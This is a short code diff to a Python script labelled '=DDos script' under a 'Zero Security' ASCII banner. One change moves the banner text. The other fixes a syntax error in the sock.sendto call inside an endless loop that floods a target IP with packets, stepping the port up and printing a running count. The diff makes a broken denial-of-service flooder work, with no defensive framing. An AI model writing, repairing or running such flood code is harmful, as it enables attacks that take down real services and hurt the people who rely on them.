@@ -27,7 +27,8 @@ print (Fore.GREEN + """
   / // _ \ '__/ _ \  \___ \ / _ \/ __| | | | '__| | __| | | |
  / /|  __/ | | (_) |  ___) |  __/ (__| |_| | |  | | |_| |_| |
 /____\___|_|  \___/  |____/ \___|\___|\__,_|_|  |_|\__|\__, |
- =DDos script=                                                      |___/ 
+                                                      |___/ 
+ =DDos script=
 
 """)
 
@@ -47,7 +48,7 @@ if data == "1":
     sent = 0
     while True:
 
-        sock.sendto(bytes, (ip:port))
+        sock.sendto(bytes, (ip,port))
         sent = sent + 1
         port = port + 1
         print (Fore.RED + "=> Sent %s Packet To %s Throught Port > %s <"%(sent,ip,port))
